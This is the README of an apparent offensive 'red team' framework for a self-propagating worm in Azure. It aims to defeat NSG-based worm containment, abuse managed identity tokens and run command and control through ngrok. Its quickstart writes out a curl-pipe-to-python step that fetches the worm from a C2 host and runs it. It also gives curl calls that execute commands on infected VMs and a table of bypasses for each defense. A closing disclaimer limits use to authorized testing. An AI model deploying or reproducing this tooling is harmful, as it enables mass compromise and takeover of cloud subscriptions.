# 🐛 Azure Worm PoC - NSG Evasion Pentest Framework

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Python 3.11+](https://img.shields.io/badge/Python-3.11%2B-blue.svg)](https://www.python.org/downloads/)

**Red Team Framework** simulating worm propagation in Azure environments, specifically designed to **bypass dynamic NSG containment** (https://github.com/63n713m4n/Network-Worm-Containment-with-Azure-NSGs).

## 🎯 Features
- ✅ **NSG Evasion** - HTTPS tunneling + priority rule insertion
- ✅ **MSI Token Abuse** - Privilege escalation via Managed Identities  
- ✅ **Self-Propagation** - Auto-spreads across VNET/subscription
- ✅ **Stealth C2** - Azure-native beacons (Storage/Functions)
- ✅ **TTL Cleanup** - 24h self-destruct
- ✅ **Dockerized C2** - One-command deployment

## 🛠️ Attack Flow
    Initial Foothold VM → docker-compose up (C2)
    curl propagate.py | python3 → Infects ALL subscription VMs
    Beacons → https://your-c2.ngrok.app/api/beacons
    Remote shell → curl "https://c2/exec?vm=TARGET&cmd=whoami"

## 🚀 Quickstart

### 1. Deploy C2 (30 seconds)
```bash
git clone https://github.com/YOURUSERNAME/azure-worm-poc
cd azure-worm-poc
# Add your ngrok token to docker-compose.yml
docker-compose up -d
# Grab C2 URL from logs:
docker-compose logs c2-server | grep ngrok

## From Compromised VM*

# Replace with your C2 URL
C2_URL="https://abc123.ngrok-free.app"
curl -s ${C2_URL}/propagate.py | python3 -

## Command & Control

# Monitor infection
curl ${C2_URL}/api/beacons | jq

# Execute commands
curl "${C2_URL}/exec?vm=WEB01&cmd=whoami"
curl "${C2_URL}/exec?vm=WEB01&cmd=az%20network%20nsg%20list"

## 🎭 Evasion Techniques vs NSG Containment


🎭 Evasion Techniques vs NSG Containment


Defense                 Bypass

IP Blocks               HTTPS over 443 + IP rotation
Dynamic Rules           Priority 48 insertion (beats 100+)
MSI Restrictions        UserAssignedIdentity attach
Detection               Azure-native traffic only
Persistence             Custom Script Extensions


## 🔧 Prerequisites
        Azure subscription access (Contributor role)
        Docker + ngrok account (free tier OK)
        Python 3.11+ on target VMs
        Initial foothold (RDP/SSH)


## ⚠️ Authorized Use Only

✅ Penetration testing with written permission
✅ Red team exercises  
✅ Security research/CTFs
❌ Unauthorized access
❌ Production environments without approval


## 📈 Expected Results

T+0s:  C2 online
T+30s: Foothold executes propagate.py
T+2m:  80% VM infection
T+5m:  Full subscription control





